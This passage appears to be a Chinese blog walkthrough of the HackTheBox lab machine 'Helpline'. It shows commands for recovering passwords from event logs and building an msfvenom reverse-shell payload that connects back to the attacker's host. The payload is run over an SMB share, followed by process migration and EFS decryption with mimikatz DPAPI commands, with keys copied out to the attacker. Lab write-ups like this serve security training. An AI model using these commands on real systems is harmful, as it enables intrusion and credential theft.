+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Administrator</span></span><br><span class="line"><span class="string">Guest</span></span><br><span class="line"><span class="string">alice</span></span><br><span class="line"><span class="string">zachary</span></span><br><span class="line"><span class="string">leo</span></span><br><span class="line"><span class="string">niels</span></span><br><span class="line"><span class="string">tolu</span></span><br></pre></td></tr></table></figure>
+<p>其中唯一可以破解的就是 zachary 用户，密码为 0987654321，但是该账户不是管理员权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user zachary</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%885.41.58.png" alt="截屏2021-12-26 上午5.41.58"><br>该用户位于日志权限读取组中，猜测日志中是否会存密码，于是查询日志并找到了 tolu 密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe security /rd:<span class="literal">true</span> /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 &gt; eventlog.txt </span><br><span class="line"><span class="built_in">type</span> eventlog.txt | findstr tolu </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%885.43.31.png" alt="截屏2021-12-26 上午5.43.31"><br>账号密码为 tolu/!zaq1234567890pl!99。与此同时发现这是个管理员用户<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%885.43.46.png" alt="截屏2021-12-26 上午5.43.46"><br>日志文件中出现用户名和密码，说明该用户可能已经登陆。接下来我们需要 msf 来帮助我们注入该管理员进程当中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.4 lport=4444 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%884.53.17.png" alt="截屏2021-12-26 下午4.53.17"><br>在本地开启 smb 共享并设置账号密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -smb2support -username mac -password mac share /root/hackthebox/Machines/Helpline </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%884.52.53.png" alt="截屏2021-12-26 下午4.52.53"><br>设置 msf 监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x <span class="string">&quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.4; set lport 4444; exploit -j;&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.04.45.png" alt="截屏2021-12-26 下午5.04.45"><br>在靶机上通过 smb 共享来运行该执行程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.14.4\share /u:mac mac</span><br><span class="line">\\10.10.14.4\share\msf.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.06.02.png" alt="截屏2021-12-26 下午5.06.02"><br>成功收到 meterpreter 会话，开始查看进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.13.12.png" alt="截屏2021-12-26 下午5.13.12"><br>但是其中只发现了 leo 的进程，查看 leo 用户后发现其也是管理员，那么直接注入进程 explorer.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 4584 </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.16.50.png" alt="截屏2021-12-26 下午5.16.50"><br>成功注入，查看该用户下的文件，发现 admin-passs.xml</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load_powershell</span><br><span class="line">meterpreter &gt; powershell_shell</span><br><span class="line">PS &gt; <span class="built_in">cd</span> C:\Users\leo\Desktop</span><br><span class="line">PS &gt; ls</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.19.04.png" alt="截屏2021-12-26 下午5.19.04"><br>获取该账号密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; <span class="built_in">type</span> admin-pass.xml</span><br><span class="line">PS &gt; <span class="variable">$s</span> = cat admin-pass.xml</span><br><span class="line">PS &gt; <span class="variable">$ss</span> = Convertto-securestring -string <span class="variable">$s</span></span><br><span class="line">PS &gt; <span class="variable">$cred</span> = new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="string">&quot;administrator&quot;</span>, <span class="variable">$ss</span></span><br><span class="line">PS &gt; <span class="variable">$cred</span>.GetNetWorkCredential().password</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.27.20.png" alt="截屏2021-12-26 下午5.27.20"><br>成功读取到密码为 mb@letmein@SERVER#acc，现在已经有了 administrator 的凭证，我们可以尝试读取其中的 root.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; Invoke-Command -ScriptBlock &#123; whoami &#125; -Credential <span class="variable">$cred</span> -Computer localhost</span><br><span class="line">PS &gt; Invoke-Command -ScriptBlock &#123; <span class="built_in">type</span> C:\Users\Administrator\Desktop\root.txt &#125; -Credential <span class="variable">$cred</span> -Computer localhost</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.31.59.png" alt="截屏2021-12-26 下午5.31.59"><br>但是显示报错，我需要通过<code>-auth CredSSP</code>来进行认证绕过EFS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; Invoke-Command -ScriptBlock &#123; <span class="built_in">type</span> C:\users\administrator\desktop\root.txt &#125; -Credential <span class="variable">$cred</span> -Computer localhost -auth credssp</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.51.38.png" alt="截屏2021-12-26 下午5.51.38"><br>成功读取到flag</p>
+<h2 id="0x04-解密EFS"><a href="#0x04-解密EFS" class="headerlink" title="0x04 解密EFS"></a>0x04 解密EFS</h2><h3 id="读取root-txt"><a href="#读取root-txt" class="headerlink" title="读取root.txt"></a>读取root.txt</h3><h4 id="获取证书"><a href="#获取证书" class="headerlink" title="获取证书"></a>获取证书</h4><p>解密 EFS 文件需要根据 mimikatz 中的指南来操作，切换到 system 用户找到目标 administrator 证书</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates</span><br><span class="line">dir /a /b</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.56.49.png" alt="截屏2021-12-26 下午5.56.49"><br>拿到证书地址为 FB154575993A250FE826DBAC79EF26C211CB77B3，通过 mimikatz 来获取证书信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto::system /file:<span class="string">&quot;C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\FB154575993A250FE826DBAC79EF26C211CB77B3&quot;</span> /<span class="built_in">export</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.59.55.png" alt="截屏2021-12-26 下午5.59.55"><br>证书成功保存，密钥的容器ID为<code>3dd3e213-bce6-4acb-808c-a1b3227ecbde</code></p>
+<h4 id="获取私钥"><a href="#获取私钥" class="headerlink" title="获取私钥"></a>获取私钥</h4><p>在<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA</code>中存在一个容器ID</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA</span><br><span class="line">dir /a /b</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.04.56.png" alt="截屏2021-12-26 下午6.04.56"><br>在其中只存在一个潜在的密钥文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> S-1-5-21-3107372852-1132949149-763516304-500</span><br><span class="line">dir /a /b</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.05.51.png" alt="截屏2021-12-26 下午6.05.51"><br>获取到一个密钥容器文件<code>d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85</code>，使用 mimikatz 生成对应的私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::capi /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.09.07.png" alt="截屏2021-12-26 下午6.09.07"><br>生成的私钥是经过 masterkey 加密的<code>9e78687d-d881-4ccb-8bd8-bc0a19608687</code></p>
+<h4 id="解密万能钥匙"><a href="#解密万能钥匙" class="headerlink" title="解密万能钥匙"></a>解密万能钥匙</h4><p>使用该 guid 在以下位置找到加密的主密钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-500</span><br><span class="line">dir /a</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.12.33.png" alt="截屏2021-12-26 下午6.12.33"><br>通过 mimikatz 使用 administrator 的密码来解密密钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::masterkey /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-500\9e78687d-d881-4ccb-8bd8-bc0a19608687&quot;</span> /password:mb@letmein@SERVER<span class="comment">#acc</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.16.59.png" alt="截屏2021-12-26 下午6.16.59"><br>其中生成的 sha1 就是万能密钥</p>
+<h4 id="解密私钥"><a href="#解密私钥" class="headerlink" title="解密私钥"></a>解密私钥</h4><p>使用 mimikatz 运行命令解密私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::capi /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.24.56.png" alt="截屏2021-12-26 下午6.24.56"><br>现在我们拥有 pvk 文件，将它与之前生成的 der 文件通过 smb 共享复制到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.14.4\share /u:mac mac</span><br><span class="line">copy \windows\system32\spool\drivers\color\raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk \\10.10.14.4\share\</span><br><span class="line">copy \windows\system32\spool\drivers\color\FB154575993A250FE826DBAC79EF26C211CB77B3.der \\10.10.14.4\share\</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.30.02.png" alt="截屏2021-12-26 下午6.30.02"></p>
+<h4 id="构建并安装PFX"><a href="#构建并安装PFX" class="headerlink" title="构建并安装PFX"></a>构建并安装PFX</h4><p>使用 openssl 创建一个 pfx 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform DER -outform PEM -<span class="keyword">in</span> FB154575993A250FE826DBAC79EF26C211CB77B3.der -out public.pem</span><br><span class="line">openssl rsa -inform PVK -outform PEM -<span class="keyword">in</span> raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk  -out private.pem</span><br><span class="line">openssl pkcs12 -<span class="keyword">in</span> public.pem -inkey private.pem -password pass:mac -keyex -CSP <span class="string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="built_in">export</span> -out cert.pfx</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.33.14.png" alt="截屏2021-12-26 下午6.33.14"><br>将生成的 pfx 文件复制回靶机当中并安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy \\10.10.14.4\share\cert.pfx \windows\system32\spool\drivers\color\cert.pfx</span><br><span class="line">certutil -user -p mac -importpfx \windows\system32\spool\drivers\color\cert.pfx NoChain,NoRoot</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.46.07.png" alt="截屏2021-12-26 下午6.46.07"><br>读取 root.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\\users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.47.49.png" alt="截屏2021-12-26 下午6.47.49"></p>
+<h3 id="读取user-txt"><a href="#读取user-txt" class="headerlink" title="读取user.txt"></a>读取user.txt</h3><h4 id="获取证书-1"><a href="#获取证书-1" class="headerlink" title="获取证书"></a>获取证书</h4><p>在 tolu 用户的桌面上我们可以发现 user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\tolu\Desktop /b</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.50.11.png" alt="截屏2021-12-26 下午6.50.11"><br>与之前解密 administrator 的 EFS 一样，我们需要解密 tolu 用户的 EFS，这里就直接快速操作，首先是获取证书</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates /a /b</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.54.10.png" alt="截屏2021-12-26 下午6.54.10"><br>在 mimikatz 中寻找证书信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto::system /file:<span class="string">&quot;C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29&quot;</span> /<span class="built_in">export</span></span><br></pre></td></tr></table></figure>
